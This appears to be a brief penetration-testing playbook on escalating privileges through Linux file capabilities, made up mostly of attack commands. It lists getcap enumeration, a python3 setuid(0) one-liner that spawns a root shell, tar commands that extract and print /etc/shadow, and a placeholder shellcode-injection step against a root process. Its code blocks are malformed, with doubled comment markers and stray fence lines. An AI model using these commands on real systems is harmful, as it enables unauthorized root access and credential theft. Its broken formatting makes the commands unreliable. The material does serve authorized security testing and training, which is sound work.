# Linux Capabilities Privilege Escalation

## When to Use
- During the post-exploitation phase on a Linux system after acquiring a low-privileged shell.
- When standard privilege escalation vectors (sudoers, SUID binaries, cron jobs) yield no results.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Enumerating File Capabilities

```bash
# getcap -r / 2>/dev/null

# ```

### Phase 2: Exploiting cap_setuid (e.g., Python, Perl, Tar)

```bash
# # python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# ```

### Phase 3: Exploiting cap_dac_read_search (e.g., Tar)

```bash
# # tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

### Phase 4: Exploiting cap_sys_ptrace (Process Injection)

```bash
# inject_shellcode $(pidof root_process)
```
